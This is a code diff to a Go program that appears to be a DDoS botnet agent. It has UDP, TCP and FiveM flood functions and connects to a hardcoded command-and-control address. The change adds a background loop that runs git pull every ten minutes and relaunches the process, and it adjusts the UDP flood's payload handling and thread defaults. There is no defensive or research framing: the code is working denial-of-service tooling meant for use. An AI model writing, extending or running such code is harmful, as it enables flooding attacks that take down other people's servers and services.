@@ -5,7 +5,10 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"os"
+	"os/exec"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 )
@@ -19,16 +22,47 @@ type AttackCommand struct {
 	Duration   int    `json:"duration"`
 }
 
-// UdpFlood implements the UDP flood attack with randomized payloads
+func checkForUpdates() {
+	for {
+		time.Sleep(10 * time.Minute)
+		// Prüft GitHub Repository auf Änderungen (git pull)
+		cmd := exec.Command("git", "pull")
+		output, err := cmd.CombinedOutput()
+		if err == nil && !strings.Contains(string(output), "Already up to date") {
+			fmt.Println("[AUTO-UPDATE] Update gefunden! Starte Agent neu...")
+
+			// Startet den Prozess neu mit den gleichen Argumenten
+			newCmd := exec.Command(os.Args[0], os.Args[1:]...)
+			newCmd.Stdout = os.Stdout
+			newCmd.Stderr = os.Stderr
+			newCmd.Stdin = os.Stdin
+
+			err := newCmd.Start()
+			if err != nil {
+				fmt.Printf("[AUTO-UPDATE] Fehler beim Neustart: %v\n", err)
+				continue
+			}
+
+			os.Exit(0) // Beende alten Prozess
+		}
+	}
+}
+
+// UdpFlood implements the UDP flood attack (User Logic)
 func UdpFlood(IP, PORT string, SECONDS int, SIZE int, THREADS int) {
+	if SIZE <= 0 {
+		SIZE = 1472
+	}
 	var wg sync.WaitGroup
-	fmt.Printf("[%s] UDP Attack started: %s:%s for %ds (Randomized Payloads)\n",
+	fmt.Printf("[%s] UDP Attack started: %s:%s for %ds\n",
 		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
 	stop := make(chan struct{})
+	payload := make([]byte, SIZE)
+	rand.Read(payload)
 	addr := net.JoinHostPort(IP, PORT)
 
 	if THREADS <= 0 {
-		THREADS = 500
+		THREADS = 200 // Default aus User-Snippet
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -40,14 +74,11 @@ func UdpFlood(IP, PORT string, SECONDS int, SIZE int, THREADS int) {
 				return
 			}
 			defer conn.Close()
-
-			payload := make([]byte, SIZE)
 			for {
 				select {
 				case <-stop:
 					return
 				default:
-					rand.Read(payload) // Randomize payload for each packet
 					conn.Write(payload)
 				}
 			}
@@ -56,7 +87,6 @@ func UdpFlood(IP, PORT string, SECONDS int, SIZE int, THREADS int) {
 
 	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() { close(stop) })
 	wg.Wait()
-	fmt.Println("UDP Attack finished.")
 }
 
 // TcpFlood implements the TCP flood attack
@@ -185,6 +215,8 @@ func FiveMFlood(IP, PORT string, SECONDS int, THREADS int) {
 }
 
 func main() {
+	go checkForUpdates()
+
 	// HIER DEINE CONTROLLER-IP EINTRAGEN
 	controllerAddr := "89.36.35.109:9999"
 
